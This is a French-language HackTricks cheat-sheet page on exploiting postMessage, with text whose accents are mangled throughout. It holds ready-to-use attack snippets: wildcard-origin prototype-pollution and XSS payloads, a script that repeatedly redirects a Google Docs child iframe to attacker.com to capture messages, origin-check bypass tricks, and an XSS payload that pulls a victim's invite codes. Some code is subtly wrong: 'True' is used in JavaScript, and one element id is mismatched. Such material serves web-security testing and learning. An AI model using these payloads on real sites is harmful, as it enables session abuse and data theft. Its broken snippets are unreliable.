# Vuln√©rabilit√©s PostMessage

## Vuln√©rabilit√©s PostMessage

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Envoyer **PostMessage**

**PostMessage** utilise la fonction suivante pour envoyer un message :
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Notez que **targetOrigin** peut √™tre un '\*' ou une URL comme _https://company.com._\
Dans le **deuxi√®me sc√©nario**, le **message ne peut √™tre envoy√© qu'√† ce domaine** (m√™me si l'origine de l'objet fen√™tre est diff√©rente).\
Si le **joker** est utilis√©, les **messages pourraient √™tre envoy√©s √† n'importe quel domaine**, et seront envoy√©s √† l'origine de l'objet fen√™tre.

### Attaquer l'iframe & le joker dans **targetOrigin**

Comme expliqu√© dans [**ce rapport**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si vous trouvez une page qui peut √™tre **ifram√©e** (pas de protection `X-Frame-Header`) et qui envoie un message **sensible** via **postMessage** en utilisant un **joker** (\*), vous pouvez **modifier** l'**origine** de l'**iframe** et **exposer** le **message sensible** √† un domaine contr√¥l√© par vous.\
Notez que si la page peut √™tre ifram√©e mais que le **targetOrigin** est **d√©fini sur une URL et non sur un joker**, ce **truc ne fonctionnera pas**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Exploitation de addEventListener

**`addEventListener`** est la fonction utilis√©e par JS pour d√©clarer la fonction qui **attend les `postMessages`**.\
Un code similaire √† celui ci-dessous sera utilis√© :
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Notez dans ce cas comment la **premi√®re chose** que le code fait est de **v√©rifier l'origine**. C'est terriblement **important** surtout si la page va faire **quelque chose de sensible** avec les informations re√ßues (comme changer un mot de passe). **Si elle ne v√©rifie pas l'origine, les attaquants peuvent faire en sorte que les victimes envoient des donn√©es arbitraires √† ces points de terminaison** et changer les mots de passe des victimes (dans cet exemple).

### √ânum√©ration

Pour **trouver des √©couteurs d'√©v√©nements** dans la page actuelle, vous pouvez :

* **Rechercher** le code JS pour `window.addEventListener` et `$(window).on` (_version JQuery_)
* **Ex√©cuter** dans la console des outils de d√©veloppement : `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Aller √†** _√âl√©ments --> √âcouteurs d'√©v√©nements_ dans les outils de d√©veloppement du navigateur

![](<../../.gitbook/assets/image (617).png>)

* Utiliser une **extension de navigateur** comme [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ces extensions de navigateur vont **intercepter tous les messages** et vous les montrer.

### Contournements de v√©rification d'origine

- L'attribut **`event.isTrusted`** est consid√©r√© comme s√©curis√© car il renvoie `True` uniquement pour les √©v√©nements g√©n√©r√©s par des actions d'utilisateurs authentiques. Bien qu'il soit difficile √† contourner s'il est impl√©ment√© correctement, son importance dans les v√©rifications de s√©curit√© est notable.

- L'utilisation de **`indexOf()`** pour la validation d'origine dans les √©v√©nements PostMessage peut √™tre sujette √† contournement. Un exemple illustrant cette vuln√©rabilit√© est :

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- La m√©thode **`search()`** de `String.prototype.search()` est destin√©e aux expressions r√©guli√®res, pas aux cha√Ænes de caract√®res. Passer autre chose qu'une expression r√©guli√®re entra√Æne une conversion implicite en regex, rendant la m√©thode potentiellement non s√©curis√©e. Cela est d√ª au fait qu'en regex, un point (.) agit comme un caract√®re g√©n√©rique, permettant de contourner la validation avec des domaines sp√©cialement con√ßus. Par exemple :

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La fonction **`match()`**, similaire √† `search()`, traite les regex. Si le regex est mal structur√©, il pourrait √™tre sujet √† contournement.

- La fonction **`escapeHtml`** est destin√©e √† nettoyer les entr√©es en √©chappant les caract√®res. Cependant, elle ne cr√©e pas un nouvel objet √©chapp√© mais √©crase les propri√©t√©s de l'objet existant. Ce comportement peut √™tre exploit√©. En particulier, si un objet peut √™tre manipul√© de telle sorte que sa propri√©t√© contr√¥l√©e ne reconna√Æt pas `hasOwnProperty`, l'`escapeHtml` ne fonctionnera pas comme pr√©vu. Cela est d√©montr√© dans les exemples ci-dessous :

- √âchec attendu :
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Contournement de l'√©chappement :
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Dans le contexte de cette vuln√©rabilit√©, l'objet `File` est notablement exploitable en raison de sa propri√©t√© `name` en lecture seule. Cette propri√©t√©, lorsqu'elle est utilis√©e dans des mod√®les, n'est pas nettoy√©e par la fonction `escapeHtml`, ce qui entra√Æne des risques potentiels pour la s√©curit√©.

- La propri√©t√© `document.domain` en JavaScript peut √™tre d√©finie par un script pour raccourcir le domaine, permettant une application plus souple de la politique de m√™me origine dans le m√™me domaine parent.

### Contournement de e.origin == window.origin

Lors de l'int√©gration d'une page web dans un **iframe sandbox√©** en utilisant %%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%, il est crucial de comprendre que l'origine de l'iframe sera d√©finie sur `null`. Cela est particuli√®rement important lorsqu'il s'agit des **attributs sandbox** et de leurs implications sur la s√©curit√© et la fonctionnalit√©.

En sp√©cifiant **`allow-popups`** dans l'attribut sandbox, toute fen√™tre contextuelle ouverte depuis l'iframe h√©rite des restrictions de sandbox de son parent. Cela signifie que sauf si l'attribut **`allow-popups-to-escape-sandbox`** est √©galement inclus, l'origine de la fen√™tre contextuelle est √©galement d√©finie sur `null`, correspondant √† l'origine de l'iframe.

Par cons√©quent, lorsqu'une fen√™tre contextuelle est ouverte dans ces conditions et qu'un message est envoy√© de l'iframe √† la fen√™tre contextuelle en utilisant **`postMessage`**, les origines d'envoi et de r√©ception sont d√©finies sur `null`. Cette situation conduit √† un sc√©nario o√π **`e.origin == window.origin`** est √©valu√© √† vrai (`null == null`), car l'iframe et la fen√™tre contextuelle partagent la m√™me valeur d'origine `null`.

Pour plus d'informations, **lire** :

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Contournement de e.source

Il est possible de v√©rifier si le message provient de la m√™me fen√™tre √† laquelle le script √©coute (particuli√®rement int√©ressant pour les **Scripts de contenu des extensions de navigateur** pour v√©rifier si le message a √©t√© envoy√© depuis la m√™me page) :
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Vous pouvez forcer **`e.source`** d'un message √† √™tre nul en cr√©ant un **iframe** qui **envoie** le **postMessage** et est **imm√©diatement supprim√©**.

Pour plus d'informations, **lisez :**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Contournement de l'en-t√™te X-Frame

Pour effectuer ces attaques, id√©alement, vous pourrez **mettre la page web victime** √† l'int√©rieur d'un `iframe`. Mais certains en-t√™tes comme `X-Frame-Header` peuvent **emp√™cher** ce **comportement**.\
Dans ces sc√©narios, vous pouvez toujours utiliser une attaque moins discr√®te. Vous pouvez ouvrir un nouvel onglet vers l'application web vuln√©rable et communiquer avec elle :
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Vol de message envoy√© √† l'enfant en bloquant la page principale

Sur la page suivante, vous pouvez voir comment vous pourriez voler des donn√©es sensibles envoy√©es via un **message postmessage** √† un **iframe enfant** en **bloquant** la **page principale** avant d'envoyer les donn√©es et en exploitant un **XSS dans l'enfant** pour **voler les donn√©es** avant qu'elles ne soient re√ßues :

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Vol de message en modifiant l'emplacement de l'iframe

Si vous pouvez int√©grer une page web sans en-t√™te X-Frame qui contient un autre iframe, vous pouvez **modifier l'emplacement de cet iframe enfant**, donc s'il re√ßoit un **message postmessage** envoy√© en utilisant un **joker**, un attaquant pourrait **modifier** l'**origine** de cet iframe vers une page **contr√¥l√©e** par lui et **voler** le message :

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage vers Pollution de Prototype et/ou XSS

Dans les sc√©narios o√π les donn√©es envoy√©es via `postMessage` sont ex√©cut√©es par JS, vous pouvez **int√©grer** la **page** et **exploiter** la **pollution de prototype/XSS** en envoyant l'exploit via `postMessage`.

Un couple de **XSS tr√®s bien expliqu√©s via `postMessage`** peuvent √™tre trouv√©s sur [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Exemple d'une exploitation pour abuser de la **pollution de prototype puis du XSS** via un `postMessage` vers un `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Pour **plus d'informations** :

* Lien vers la page sur la [**pollution de prototype**](../deserialization/nodejs-proto-prototype-pollution/)
* Lien vers la page sur le [**XSS**](../xss-cross-site-scripting/)
* Lien vers la page sur la [**pollution de prototype c√¥t√© client vers XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## R√©f√©rences

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Pour pratiquer : [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
